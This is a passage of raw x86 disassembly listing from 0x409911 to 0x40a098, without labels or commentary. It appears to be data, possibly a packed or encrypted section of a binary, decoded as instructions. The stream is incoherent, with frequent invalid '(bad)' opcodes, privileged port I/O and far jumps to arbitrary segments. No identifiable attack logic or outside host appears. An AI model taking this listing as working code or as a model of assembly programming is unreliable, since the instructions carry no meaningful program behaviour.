  409911:	mov    edx,DWORD PTR [edx+0x7d]
  409914:	mov    esi,0xdca2f6cb
  409919:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40991a:	fisttp QWORD PTR [eax+edx*2-0x29]
  40991e:	(bad)  
  40991f:	clc    
  409920:	addr16 xor eax,0xc8976465
  409926:	dec    edx
  409927:	test   eax,0xa81e7ec8
  40992c:	dec    ecx
  40992d:	xchg   esp,eax
  40992e:	jg     0x4098e7
  409930:	pop    ds
  409931:	ret    0x2141
  409934:	push   0xba3d30c0
  409939:	scas   al,BYTE PTR es:[edi]
  40993a:	das    
  40993b:	xchg   edx,eax
  40993c:	jbe    0x4098e3
  40993e:	pop    eax
  40993f:	clc    
  409940:	jb     0x4098df
  409942:	inc    esp
  409943:	xchg   ebp,eax
  409944:	icebp  
  409945:	out    0xa9,eax
  409947:	jl     0x4099b9
  409949:	dec    edi
  40994a:	test   dh,0x11
  40994d:	jmp    0xc1b9:0x31ab6b56
  409954:	inc    esi
  409955:	and    eax,0xd383de0c
  40995a:	retf   
  40995b:	add    eax,0xb45bd7b
  409960:	pushf  
  409961:	sbb    al,0x45
  409963:	jle    0x409957
  409965:	rcl    DWORD PTR [ecx+0x2d],1
  409968:	or     esi,ecx
  40996a:	mov    bh,0xe6
  40996c:	jbe    0x409973
  40996e:	jge    0x409987
  409970:	es in  al,dx
  409972:	arpl   si,di
  409974:	sti    
  409975:	jno    0x409992
  409977:	push   ds
  409978:	out    dx,al
  409979:	int3   
  40997a:	push   esi
  40997b:	jns    0x40994e
  40997d:	cmp    esi,esi
  40997f:	xor    al,0xd9
  409981:	cmp    BYTE PTR [ebp-0x232f1e3a],0x6
  409988:	mov    al,0x75
  40998a:	stc    
  40998b:	and    eax,0x5e8309e2
  409990:	adc    eax,0xe555ef7b
  409995:	shr    edx,cl
  409997:	cmp    al,0xef
  409999:	bound  ebp,QWORD PTR [edx]
  40999b:	cwde   
  40999c:	and    al,0x76
  40999e:	cmp    esp,DWORD PTR [edi-0x1b]
  4099a1:	ret    
  4099a2:	xchg   edi,eax
  4099a3:	fs scas al,BYTE PTR es:[edi]
  4099a5:	repz inc ecx
  4099a7:	leave  
  4099a8:	ja     0x4099cb
  4099aa:	xor    ebp,DWORD PTR [edx+ecx*1-0x1b]
  4099ae:	xor    DWORD PTR [ebx],esp
  4099b0:	push   eax
  4099b1:	and    esp,DWORD PTR [ebx+0x22]
  4099b4:	sub    al,0x99
  4099b6:	sub    eax,0x5ff32748
  4099bb:	mov    ah,0x5c
  4099bd:	adc    bl,bh
  4099bf:	js     0x4099e6
  4099c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099c2:	push   cs
  4099c3:	popa   
  4099c4:	les    ecx,FWORD PTR [ebx+0x1f]
  4099c7:	test   DWORD PTR [ecx],edx
  4099c9:	cmovs  esp,DWORD PTR [esi+0x40]
  4099cd:	nop
  4099ce:	adc    ah,BYTE PTR [edx+ebp*2+0x46]
  4099d2:	pushw  0x4a
  4099d5:	dec    ebp
  4099d6:	dec    edx
  4099d7:	push   ebp
  4099d8:	ror    DWORD PTR [edi+0x2b3a486e],0x28
  4099df:	jge    0x4099c5
  4099e1:	inc    edi
  4099e2:	fldcw  WORD PTR [eax+0x477ad262]
  4099e8:	out    dx,eax
  4099e9:	rcl    DWORD PTR [edx],1
  4099eb:	push   esi
  4099ec:	sub    ah,BYTE PTR [ebp+0x5ea876c0]
  4099f2:	pop    ebp
  4099f3:	push   ds
  4099f4:	pop    ecx
  4099f5:	in     eax,0x7f
  4099f7:	mov    ds:0x73aa3f3d,al
  4099fc:	pop    ebp
  4099fd:	bound  ebx,QWORD PTR [edx+0x137fb944]
  409a03:	cmc    
  409a04:	imul   esp,DWORD PTR [edi],0x7b
  409a07:	(bad)  
  409a09:	js     0x409a3b
  409a0b:	mov    WORD PTR [ecx-0x5c],?
  409a0e:	out    0x34,eax
  409a10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a11:	sub    ebx,ecx
  409a13:	push   edx
  409a14:	and    BYTE PTR [eax],ch
  409a16:	call   0xfb35:0x6d10e4d3
  409a1d:	mov    ch,0xa
  409a1f:	cmp    eax,0x1fa72c4d
  409a24:	leave  
  409a25:	or     al,0x59
  409a27:	scas   al,BYTE PTR es:[edi]
  409a28:	nop
  409a29:	test   DWORD PTR [edi],ebx
  409a2b:	inc    esp
  409a2c:	adc    BYTE PTR [eax-0x19],0x46
  409a30:	xchg   BYTE PTR [ebx],al
  409a32:	in     al,0xf4
  409a34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a35:	jge    0x409aa7
  409a37:	test   edx,edi
  409a39:	mov    cl,0x64
  409a3b:	add    dh,ah
  409a3d:	xchg   esi,eax
  409a3e:	xor    ecx,edx
  409a40:	mov    ebp,eax
  409a42:	add    ch,dh
  409a44:	es (bad) 
  409a47:	(bad)  
  409a49:	mov    eax,ds:0x2788114b
  409a4e:	scas   eax,DWORD PTR es:[edi]
  409a4f:	rsqrtps xmm7,xmm7
  409a52:	jbe    0x409a76
  409a54:	xor    eax,esp
  409a56:	(bad)  
  409a57:	mov    edx,gs
  409a59:	mov    esp,0xe5239716
  409a5e:	out    dx,ax
  409a60:	int    0xb9
  409a62:	jmp    0x409a0e
  409a64:	sbb    dh,dh
  409a66:	rol    BYTE PTR [ebp+0x794ace2d],cl
  409a6c:	jmp    0xe6cc33f5
  409a71:	mov    WORD PTR [ecx],cs
  409a73:	cmp    bl,BYTE PTR [esp+0x582d6bf3]
  409a7a:	mov    eax,ds:0x4468afa3
  409a7f:	xor    dl,dl
  409a81:	stos   DWORD PTR es:[edi],eax
  409a82:	pop    eax
  409a83:	and    ebp,ecx
  409a85:	pushf  
  409a86:	arpl   WORD PTR [edx+0x78],cx
  409a89:	bswap  esi
  409a8b:	mov    ecx,0x14e23505
  409a90:	rol    BYTE PTR [edi+ebx*4-0x6c],0xe2
  409a95:	cs sbb al,0xdd
  409a98:	or     edi,eax
  409a9a:	mov    bl,0x6b
  409a9c:	inc    edi
  409a9d:	cmc    
  409a9e:	addr16 xchg ebp,eax
  409aa0:	test   eax,0xb90d76b8
  409aa5:	adc    BYTE PTR [ebp-0x3],ah
  409aa8:	into   
  409aa9:	sbb    ebp,DWORD PTR ds:0x1b34e49c
  409aaf:	jbe    0x409a59
  409ab1:	xchg   edx,eax
  409ab2:	jmp    0x409ac8
  409ab4:	pop    edx
  409ab5:	mov    ds,WORD PTR [esi-0x64b0cdf1]
  409abb:	sub    BYTE PTR [edi+esi*1-0x2c],dh
  409abf:	adc    eax,0xfb6f87b3
  409ac4:	call   0x8277:0x24ad680b
  409acb:	mov    ebx,0x2a18530f
  409ad0:	adc    edi,DWORD PTR [eax+0x78]
  409ad3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ad4:	dec    ebx
  409ad5:	out    0x62,eax
  409ad7:	push   ebp
  409ad8:	std    
  409ad9:	call   0x8253b8ef
  409ade:	xor    ah,BYTE PTR [esi+eax*1-0x5b7a7df2]
  409ae5:	rcr    DWORD PTR [edi],0xb8
  409ae8:	push   ebp
  409aea:	pop    esp
  409aeb:	xor    al,0x6c
  409aed:	push   ds
  409aee:	mov    esi,0xdad5eacc
  409af3:	pusha  
  409af4:	cmp    al,BYTE PTR [ecx-0x6e]
  409af7:	cmp    BYTE PTR [ecx+0x3],ch
  409afa:	xchg   ebp,eax
  409afb:	mov    ds:0x3b80d23b,al
  409b00:	jne    0x409a9b
  409b02:	(bad)  
  409b03:	outs   dx,BYTE PTR ds:[esi]
  409b04:	dec    esp
  409b05:	inc    ebx
  409b06:	inc    ecx
  409b07:	pop    edi
  409b08:	out    0x58,eax
  409b0a:	xlat   BYTE PTR ds:[ebx]
  409b0b:	bound  edi,QWORD PTR [eax]
  409b0d:	sbb    eax,0xab0cee32
  409b12:	sub    al,0xe0
  409b14:	scas   eax,DWORD PTR es:[edi]
  409b15:	aad    0x9b
  409b17:	dec    ebx
  409b18:	xchg   esp,eax
  409b19:	xor    BYTE PTR [edi-0x6],ah
  409b1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b1d:	add    al,0x4a
  409b1f:	xor    BYTE PTR [ebp-0x8],bl
  409b22:	in     eax,dx
  409b23:	add    DWORD PTR [edi-0x17],ebx
  409b26:	ret    0xab3e
  409b29:	aaa    
  409b2a:	test   BYTE PTR [edi],al
  409b2c:	and    eax,0xbad82986
  409b31:	cmp    DWORD PTR [eax+0x28e537d7],esi
  409b37:	add    edi,DWORD PTR [ebp-0x77dfcb1c]
  409b3d:	mov    dl,BYTE PTR [edx+0x5b]
  409b40:	cmp    BYTE PTR [ecx+0x5f],ah
  409b43:	je     0x409acd
  409b45:	jnp    0x409b95
  409b47:	test   DWORD PTR [ecx],esi
  409b49:	ds call 0x70fe3ac0
  409b4f:	add    ah,dh
  409b51:	lock xor ebx,DWORD PTR [eax+0x707caa11]
  409b58:	retf   
  409b59:	daa    
  409b5a:	ret    
  409b5b:	lods   eax,DWORD PTR ds:[esi]
  409b5c:	xchg   ecx,eax
  409b5d:	ret    
  409b5e:	dec    ebx
  409b5f:	xchg   ebp,eax
  409b60:	clc    
  409b61:	lea    ecx,[eax-0x2f]
  409b64:	push   cs
  409b65:	rcl    DWORD PTR [edi],cl
  409b67:	and    BYTE PTR [ebx-0x343ef44a],0x6c
  409b6e:	gs out dx,eax
  409b70:	cld    
  409b71:	cmp    DWORD PTR [eax+0x68],0xffffffb9
  409b75:	cmp    DWORD PTR [eax+0x8cef7ad],ebx
  409b7b:	(bad)
  409b7e:	push   ebx
  409b7f:	mov    eax,0x5a8ff14b
  409b84:	sub    DWORD PTR [esi+0x1f],0xffffffd2
  409b88:	mov    dl,BYTE PTR [ebx]
  409b8a:	cs das 
  409b8c:	mov    edx,esp
  409b8e:	cmp    eax,0xcc50950f
  409b93:	lods   eax,DWORD PTR ds:[esi]
  409b94:	out    dx,eax
  409b95:	aad    0x4b
  409b97:	mov    ecx,0x3a2ee67d
  409b9c:	ins    BYTE PTR es:[edi],dx
  409b9d:	push   es
  409b9e:	adc    dl,BYTE PTR [esi+0x46]
  409ba1:	xchg   ebp,eax
  409ba2:	icebp  
  409ba3:	call   0x87a4:0x44e0319f
  409baa:	sbb    DWORD PTR [ecx+ebp*4],0x12
  409bae:	inc    eax
  409baf:	mov    cl,0xf5
  409bb1:	push   0x39
  409bb3:	mov    ebx,0x49b0e4e8
  409bb8:	dec    eax
  409bb9:	gs adc bh,bh
  409bbc:	lea    ebx,[ebx+0x16]
  409bbf:	(bad)  
  409bc0:	in     al,dx
  409bc1:	mov    eax,ds:0x55c90885
  409bc6:	or     DWORD PTR [ebp+esi*4-0xbcb5b13],0xffffffd7
  409bce:	mov    edx,0x1cb744d1
  409bd3:	sbb    DWORD PTR [edi+0x23],esp
  409bd6:	std    
  409bd7:	sub    eax,DWORD PTR [edi]
  409bd9:	hlt    
  409bda:	mov    dl,0x26
  409bdc:	mov    edi,0x54c20d50
  409be1:	mov    al,ds:0x23a62b76
  409be6:	push   esi
  409be7:	daa    
  409be8:	out    0xab,al
  409bea:	adc    eax,0x5326a18
  409bef:	pusha  
  409bf0:	imul   ecx,DWORD PTR [edi],0x48d63f28
  409bf6:	push   ebx
  409bf7:	shr    al,0x49
  409bfa:	push   edx
  409bfb:	cli    
  409bfc:	lds    ebx,FWORD PTR [edx]
  409bfe:	or     ah,al
  409c00:	xchg   edi,eax
  409c01:	(bad)  
  409c02:	jmp    0x409c7d
  409c04:	leave  
  409c05:	imul   esi,DWORD PTR [ecx-0x39194f97],0x7b
  409c0c:	mov    dl,0xe1
  409c0e:	rcl    BYTE PTR [ebx],0xc4
  409c11:	dec    ebp
  409c12:	sub    eax,0x6c408cd2
  409c17:	(bad)  
  409c18:	mov    dl,0x55
  409c1a:	mov    dl,0x27
  409c1c:	shl    BYTE PTR [ecx-0x2f980693],0xcc
  409c23:	call   0xbd66:0x1c10fa2f
  409c2a:	cdq    
  409c2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c2c:	xor    esp,DWORD PTR [ecx+0x0]
  409c2f:	popf   
  409c30:	out    0x99,eax
  409c32:	sahf   
  409c33:	mov    al,0x9e
  409c35:	stos   DWORD PTR es:[edi],eax
  409c36:	mov    dl,0xb9
  409c38:	mov    al,ds:0xc03f8d82
  409c3d:	repz rol BYTE PTR [esp+edi*4],cl
  409c41:	outs   dx,DWORD PTR ds:[esi]
  409c42:	xchg   DWORD PTR [esi+0x65],eax
  409c45:	aam    0x76
  409c47:	pop    DWORD PTR [edx+0x35]
  409c4a:	ja     0x409bfe
  409c4c:	shl    ebx,0x9c
  409c4f:	idiv   DWORD PTR [ecx-0x4]
  409c52:	pop    esi
  409c53:	mov    WORD PTR [ecx+esi*1-0x7a],?
  409c57:	outs   dx,BYTE PTR ds:[esi]
  409c58:	pop    esp
  409c59:	push   0x742d2c09
  409c5e:	mov    edx,0xd6233b11
  409c63:	xor    esi,edi
  409c65:	xchg   edx,eax
  409c66:	xchg   ebp,eax
  409c67:	mov    edx,0x16e82bc
  409c6c:	add    BYTE PTR [esi],0x90
  409c6f:	xchg   ecx,eax
  409c70:	adc    BYTE PTR [ebx+0x35],0xb3
  409c74:	mov    cl,0x98
  409c76:	or     BYTE PTR [edi-0x44dc2406],ah
  409c7c:	push   esp
  409c7d:	push   ebx
  409c7e:	xor    edi,edx
  409c80:	popa   
  409c81:	jge    0x409c15
  409c83:	cld    
  409c84:	retf   0xa138
  409c87:	fnsave [edx]
  409c89:	mov    ah,0x95
  409c8b:	mov    dl,0xf
  409c8d:	pop    esi
  409c8e:	pop    eax
  409c8f:	ja     0x409cb3
  409c91:	pop    ebx
  409c92:	xchg   edx,eax
  409c93:	fwait
  409c94:	popf   
  409c95:	fnstsw WORD PTR [ebx+0x34]
  409c98:	lods   al,BYTE PTR ds:[esi]
  409c99:	inc    esp
  409c9a:	aad    0x29
  409c9c:	jle    0x409d11
  409c9e:	xchg   edi,eax
  409c9f:	sbb    al,0xe2
  409ca1:	jnp    0x409cb6
  409ca3:	sub    BYTE PTR [ebx+0x3a],0x96
  409ca7:	jmp    0xc3ba46cf
  409cac:	add    edi,DWORD PTR [edx+0x3]
  409caf:	dec    edi
  409cb0:	rcl    DWORD PTR [ecx+0x77662aa1],cl
  409cb6:	add    eax,0x943a95f0
  409cbb:	int3   
  409cbc:	(bad)  
  409cbd:	out    dx,eax
  409cbe:	push   ds
  409cbf:	mov    ds:0x55bb4533,eax
  409cc4:	pop    ds
  409cc5:	adc    esp,0x32
  409cc8:	pop    ss
  409cc9:	rol    DWORD PTR cs:[esp+edi*2],0xeb
  409cce:	dec    eax
  409ccf:	or     BYTE PTR [ebp+0x25d2de07],bh
  409cd5:	push   0xffffffe8
  409cd7:	jmp    0xe434:0x3c41ee8e
  409cde:	inc    bx
  409ce0:	pop    ebp
  409ce1:	or     DWORD PTR [eax+0x65b100e0],0x2c475ad6
  409ceb:	outs   dx,DWORD PTR ds:[esi]
  409cec:	pop    edi
  409ced:	les    esi,FWORD PTR [ebx-0x43d38549]
  409cf3:	or     eax,0x2e12486e
  409cf8:	adc    eax,0xa3565d4d
  409cfd:	pushf  
  409cfe:	je     0x409d18
  409d00:	sub    eax,0xbea088a
  409d05:	dec    edi
  409d06:	mov    esp,0x41998962
  409d0b:	fs mov dl,0x10
  409d0e:	mov    dh,0x7f
  409d10:	inc    edi
  409d11:	push   ebp
  409d12:	dec    edx
  409d13:	div    DWORD PTR [eax+0x58740a3d]
  409d19:	push   eax
  409d1a:	repnz bound esi,QWORD PTR [eax+0x112cb2ee]
  409d21:	inc    edx
  409d22:	sbb    esi,ebp
  409d24:	sbb    eax,0xa5d53d81
  409d29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d2a:	scas   al,BYTE PTR es:[edi]
  409d2b:	cmovae ecx,DWORD PTR [ecx-0x41f32c08]
  409d32:	shl    esp,0x4e
  409d35:	in     al,0x63
  409d37:	add    DWORD PTR [edx-0x6de41745],ebp
  409d3d:	jmp    0x43bf487e
  409d42:	and    DWORD PTR [esi+esi*8-0x6c],edx
  409d46:	pop    es
  409d47:	mov    al,ds:0x58b4a113
  409d4c:	jne    0x409d05
  409d4e:	mov    al,BYTE PTR [eax+0x0]
  409d51:	pop    es
  409d52:	pushf  
  409d53:	adc    al,0x78
  409d55:	test   al,0x65
  409d57:	ins    BYTE PTR es:[edi],dx
  409d58:	pop    ds
  409d59:	mov    cl,0x15
  409d5b:	push   ds
  409d5c:	lea    ebx,[eax]
  409d5e:	cmp    eax,0x32d8c7bf
  409d63:	mov    al,ds:0xc05aa6f2
  409d68:	scas   eax,DWORD PTR es:[edi]
  409d69:	(bad)  
  409d6b:	leave  
  409d6c:	lock push ecx
  409d6e:	mov    ah,0xa4
  409d70:	inc    esi
  409d71:	scas   eax,DWORD PTR es:[edi]
  409d72:	adc    al,0x14
  409d74:	mov    ds:0xfac455e1,al
  409d79:	xchg   edi,eax
  409d7a:	push   es
  409d7b:	jo     0x409d84
  409d7d:	leave  
  409d7e:	inc    edx
  409d7f:	clc    
  409d80:	xor    edx,DWORD PTR [edi+0x4d1321f]
  409d86:	or     ch,bl
  409d88:	inc    edi
  409d89:	adc    BYTE PTR [ebx+0x46],bl
  409d8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d8d:	sti    
  409d8e:	test   al,0xc6
  409d90:	dec    eax
  409d91:	mov    al,ds:0x467f2b17
  409d96:	fisttp WORD PTR [edi+ebp*2-0x19b30a69]
  409d9d:	(bad)  
  409d9e:	push   edx
  409d9f:	sahf   
  409da0:	mov    edx,0x80cd2827
  409da5:	inc    edx
  409da6:	jg     0x409dc4
  409da8:	xchg   esp,eax
  409da9:	aam    0xa8
  409dab:	es sahf 
  409dad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409dae:	xchg   ecx,eax
  409daf:	dec    ebp
  409db0:	mov    bl,0xf0
  409db2:	lods   eax,DWORD PTR ds:[esi]
  409db3:	mov    cs,esi
  409db5:	inc    ebx
  409db6:	scas   eax,DWORD PTR es:[edi]
  409db7:	aad    0x37
  409db9:	mov    ds:0x69c46bcd,eax
  409dbe:	aas    
  409dbf:	pop    edx
  409dc0:	pop    ss
  409dc1:	xchg   edi,eax
  409dc2:	push   eax
  409dc3:	and    ecx,edx
  409dc5:	jl     0x409d75
  409dc7:	xor    al,0x53
  409dc9:	repz mov eax,0x97c70c51
  409dcf:	add    al,0x9e
  409dd1:	inc    ecx
  409dd2:	sub    al,bh
  409dd4:	pusha  
  409dd5:	dec    edi
  409dd6:	inc    esi
  409dd7:	es inc edx
  409dd9:	pop    esi
  409dda:	xchg   BYTE PTR [ecx-0xb235177],ch
  409de0:	jne    0x409e33
  409de2:	(bad)  
  409de3:	xchg   edi,eax
  409de4:	mov    cs,eax
  409de6:	cmp    BYTE PTR [esi+0x2ace10cc],bl
  409dec:	push   es
  409ded:	adc    DWORD PTR [esi-0x7a581e90],ebp
  409df3:	fisttp WORD PTR [ebp+0x13]
  409df6:	push   esp
  409df7:	std    
  409df8:	aas    
  409df9:	push   eax
  409dfa:	mov    ebp,0x3c3c8d45
  409dff:	int3   
  409e00:	push   ss
  409e01:	and    eax,DWORD PTR [edx-0xe]
  409e04:	bound  ecx,QWORD PTR ds:0x259d00b5
  409e0a:	inc    esp
  409e0b:	nop
  409e0c:	lods   eax,DWORD PTR ds:[esi]
  409e0d:	jmp    0x3bb05407
  409e12:	dec    esp
  409e13:	mov    bl,0x11
  409e15:	js     0x409e31
  409e17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e18:	and    eax,0x4a01f256
  409e1d:	in     al,0x68
  409e1f:	sahf   
  409e20:	leave  
  409e21:	mov    ebx,ebx
  409e23:	or     al,BYTE PTR [edi-0x39]
  409e26:	fdivr  QWORD PTR [esi+0x2ba544b5]
  409e2c:	in     eax,dx
  409e2d:	fnsave [ecx]
  409e2f:	fadd   QWORD PTR [ebx]
  409e31:	(bad)  
  409e32:	aam    0x1b
  409e34:	fst    DWORD PTR [ebp+0x3d]
  409e37:	push   0xcfa30acc
  409e3c:	stos   DWORD PTR es:[edi],eax
  409e3d:	or     BYTE PTR [edx+0x3d365a9d],bl
  409e43:	jmp    0x98483078
  409e48:	push   edi
  409e49:	jns    0x409e3c
  409e4b:	popf   
  409e4c:	scas   eax,DWORD PTR es:[edi]
  409e4d:	dec    edi
  409e4e:	clc    
  409e4f:	ins    DWORD PTR es:[edi],dx
  409e50:	(bad)  
  409e51:	out    0x93,al
  409e53:	pop    eax
  409e54:	pop    esp
  409e55:	inc    edx
  409e56:	lods   al,BYTE PTR ds:[esi]
  409e57:	xor    eax,0x34eef203
  409e5c:	sub    al,0x46
  409e5e:	pop    es
  409e5f:	mov    al,ds:0xd10bf8a6
  409e64:	jb     0x409dfa
  409e66:	shl    cl,0x94
  409e69:	iret   
  409e6a:	js     0x409e5c
  409e6c:	push   esi
  409e6d:	stc    
  409e6e:	and    edi,DWORD PTR [ebp+edi*2-0x2b]
  409e72:	mov    eax,DWORD PTR es:[eax+ebx*1-0x542756e4]
  409e7a:	call   0x7936:0x692586c3
  409e81:	stos   BYTE PTR es:[edi],al
  409e82:	in     al,dx
  409e83:	fisubr DWORD PTR [ebp+0x7b]
  409e86:	sub    eax,0xf92b1695
  409e8b:	enter  0x8979,0x1
  409e8f:	push   ebx
  409e90:	dec    ecx
  409e91:	adc    eax,0xffffffb1
  409e94:	test   eax,0x8c66274a
  409e99:	(bad)  
  409e9a:	loopne 0x409ea9
  409e9c:	push   ds
  409e9d:	aas    
  409e9e:	inc    eax
  409e9f:	xchg   BYTE PTR [edi],ch
  409ea1:	daa    
  409ea2:	repz fwait
  409ea4:	aaa    
  409ea5:	pop    edx
  409ea6:	mov    dh,0xd6
  409ea8:	dec    eax
  409ea9:	daa    
  409eaa:	pusha  
  409eab:	xor    DWORD PTR [esi+edx*1-0x1e],edi
  409eaf:	xchg   BYTE PTR [ebx+0x293c023d],bh
  409eb5:	mov    cl,0x4a
  409eb7:	je     0x409eb3
  409eb9:	cli    
  409eba:	pop    edi
  409ebb:	and    BYTE PTR [edx-0x70],bl
  409ebe:	aam    0x5c
  409ec0:	aam    0x11
  409ec2:	out    0x51,eax
  409ec4:	push   esi
  409ec5:	push   cs
  409ec6:	and    DWORD PTR [eax-0x663b1e1e],esp
  409ecc:	or     al,0x6d
  409ece:	cmp    ebp,DWORD PTR [ebx-0x6a1afaec]
  409ed4:	adc    eax,0x2e355792
  409ed9:	fmul   DWORD PTR [ebp+0x7cc3c453]
  409edf:	sbb    DWORD PTR [edx+0x1ee47576],edi
  409ee5:	fdiv   DWORD PTR ds:0xd7a2eae2
  409eeb:	out    0xe,eax
  409eed:	mov    ebp,0xc6263313
  409ef2:	lahf   
  409ef3:	ret    
  409ef4:	inc    eax
  409ef5:	(bad)  
  409ef6:	pop    esp
  409ef7:	leave  
  409ef8:	loope  0x409f03
  409efa:	arpl   dx,sp
  409efc:	xchg   edx,eax
  409efd:	mov    esi,DWORD PTR cs:[ebp-0x56]
  409f01:	inc    ebp
  409f02:	lods   al,BYTE PTR ds:[esi]
  409f03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f04:	mov    esi,0x5878f04
  409f09:	pop    ss
  409f0a:	cli    
  409f0b:	xor    al,0xc0
  409f0d:	cmp    DWORD PTR [ebp+0x41d16b06],ebp
  409f13:	iret   
  409f14:	ja     0x409f0e
  409f16:	jnp    0x409f71
  409f18:	out    dx,eax
  409f19:	and    al,0x4b
  409f1c:	fsub   QWORD PTR [ecx]
  409f1e:	jae    0x409f12
  409f20:	push   esi
  409f21:	add    eax,0xde388b36
  409f26:	or     bh,BYTE PTR [edi+0x11341139]
  409f2c:	mov    ds:0x53e23911,eax
  409f31:	sub    esi,esi
  409f33:	fwait
  409f34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f35:	fisubr WORD PTR [esi+0x14]
  409f38:	out    0xc8,eax
  409f3a:	dec    edx
  409f3b:	fisubr DWORD PTR [esi-0x60f04dbe]
  409f41:	inc    eax
  409f42:	mov    cl,0xa8
  409f44:	rcl    DWORD PTR [esp+edx*2-0x64c48e10],0xa3
  409f4c:	outs   dx,BYTE PTR ds:[esi]
  409f4d:	out    0xba,eax
  409f4f:	lods   al,BYTE PTR ds:[esi]
  409f50:	pop    ss
  409f51:	cmp    ebp,edx
  409f53:	xchg   BYTE PTR [edx+ebp*4],dh
  409f56:	push   es
  409f57:	xchg   edi,eax
  409f58:	cmp    eax,0x86bc6684
  409f5d:	jle    0x409f30
  409f5f:	jb     0x409ef0
  409f61:	xchg   ecx,eax
  409f62:	pushf  
  409f63:	pop    es
  409f64:	scas   eax,DWORD PTR es:[edi]
  409f65:	pop    ds
  409f66:	imul   esi,edi,0x70ba9458
  409f6c:	cmp    al,0xd4
  409f6e:	test   BYTE PTR [esi],0xa4
  409f71:	popf   
  409f72:	cmp    bh,bh
  409f74:	push   es
  409f75:	ja     0x409f78
  409f77:	rcl    BYTE PTR [eax-0x45],0x93
  409f7b:	dec    esi
  409f7c:	and    DWORD PTR [esp+esi*1],ebx
  409f7f:	add    eax,DWORD PTR [ebx+eax*2]
  409f82:	dec    eax
  409f83:	jge    0x409f96
  409f85:	xchg   DWORD PTR [esi+edi*1+0x8210beb],ecx
  409f8c:	js     0x409f54
  409f8e:	inc    edi
  409f8f:	iret   
  409f90:	pop    ds
  409f91:	or     DWORD PTR [edi+esi*2-0x105274c4],esp
  409f98:	fdivr  DWORD PTR [edi]
  409f9a:	sar    DWORD PTR [ebp-0x7a552858],cl
  409fa0:	inc    ebx
  409fa1:	add    al,0xd2
  409fa3:	shr    esp,1
  409fa5:	repz aad 0xd6
  409fa8:	outs   dx,BYTE PTR ds:[esi]
  409fa9:	cmp    al,0x37
  409fab:	in     eax,dx
  409fac:	pop    ds
  409fad:	mov    eax,ds:0x4af084d2
  409fb2:	(bad)  
  409fb3:	sub    ah,BYTE PTR [edx+0x70]
  409fb6:	popa   
  409fb7:	add    DWORD PTR [esi],esp
  409fb9:	jnp    0x409f78
  409fbb:	mov    eax,ds:0xeeea576a
  409fc0:	xor    DWORD PTR [edi+edx*2-0x5e],edx
  409fc4:	fst    QWORD PTR [ebx]
  409fc6:	das    
  409fc7:	adc    DWORD PTR [ecx+ebx*8-0x25],ecx
  409fcb:	pop    ss
  409fcc:	push   ebp
  409fcd:	mov    ebx,0x6c625dcc
  409fd2:	in     al,dx
  409fd3:	test   BYTE PTR [eax],ah
  409fd5:	jle    0x409f57
  409fd7:	lods   al,BYTE PTR ds:[esi]
  409fd8:	ret    0x1e31
  409fdb:	es ss or eax,0x11629e5d
  409fe2:	pushf  
  409fe3:	cwde   
  409fe4:	pop    esp
  409fe5:	pop    edi
  409fe6:	or     BYTE PTR [edx],ah
  409fe8:	std    
  409fe9:	test   al,0x30
  409feb:	test   al,0x64
  409fed:	icebp  
  409fee:	mov    ebp,0x34516a8
  409ff3:	call   0x5e21:0x263eef7f
  409ffa:	sub    ch,0xdb
  409ffd:	xlat   BYTE PTR ds:[ebx]
  409ffe:	dec    edi
  409fff:	or     BYTE PTR [ebx+ebp*4+0x3a61c602],ch
  40a006:	js     0x40a043
  40a008:	dec    edi
  40a009:	adc    eax,DWORD PTR [ecx]
  40a00b:	sbb    ebx,DWORD PTR [esi+0x3475eb22]
  40a011:	add    eax,0x4c1282b7
  40a016:	es loope 0x40a062
  40a019:	cwde   
  40a01a:	cdq    
  40a01b:	mov    DWORD PTR [ecx+0x29],eax
  40a01e:	xchg   BYTE PTR [edx+0x69db3ae0],bl
  40a024:	scas   al,BYTE PTR es:[edi]
  40a025:	jmp    0x9e38a045
  40a02a:	push   esp
  40a02b:	pop    esp
  40a02c:	in     al,0x99
  40a02e:	mov    ecx,DWORD PTR [edi]
  40a030:	pop    esi
  40a031:	jmp    0x8885:0x604af2e4
  40a038:	in     al,0xdb
  40a03a:	cmp    al,0xd2
  40a03c:	push   ebx
  40a03d:	jl     0x40a071
  40a03f:	push   esi
  40a040:	adc    bl,BYTE PTR [ecx]
  40a042:	add    al,0xa6
  40a044:	pop    ds
  40a045:	xchg   edx,eax
  40a046:	jecxz  0x40a037
  40a048:	inc    edi
  40a049:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a04a:	jb     0x40a070
  40a04c:	jle    0x40a072
  40a04e:	retf   
  40a04f:	jl     0x40a069
  40a051:	leave  
  40a052:	cli    
  40a053:	mov    ah,0xa2
  40a055:	into   
  40a056:	out    dx,eax
  40a057:	add    dh,BYTE PTR [ebp+0x4f]
  40a05a:	sub    eax,0x4e7fb861
  40a05f:	jg     0x40a037
  40a061:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a062:	xchg   esi,eax
  40a063:	sub    al,0x28
  40a065:	arpl   WORD PTR [esi+0x1d4736af],sp
  40a06b:	pop    eax
  40a06c:	int    0xdc
  40a06e:	in     eax,0xdf
  40a070:	and    BYTE PTR [ecx+0x42],dl
  40a073:	mov    BYTE PTR [edx+0x345f8c79],ch
  40a079:	pop    eax
  40a07a:	add    al,0x53
  40a07c:	into   
  40a07d:	ud2    
  40a07f:	jae    0x40a0d1
  40a081:	sbb    cl,BYTE PTR [esi+0x66913904]
  40a087:	(bad)  
  40a088:	inc    esp
  40a089:	in     eax,0x24
  40a08b:	test   esi,0xb1744752
  40a091:	mov    es,WORD PTR [esi+0x6a]
  40a094:	mov    gs,WORD PTR [edx+esi*1+0x75]
  40a098:	sub    al,0x12
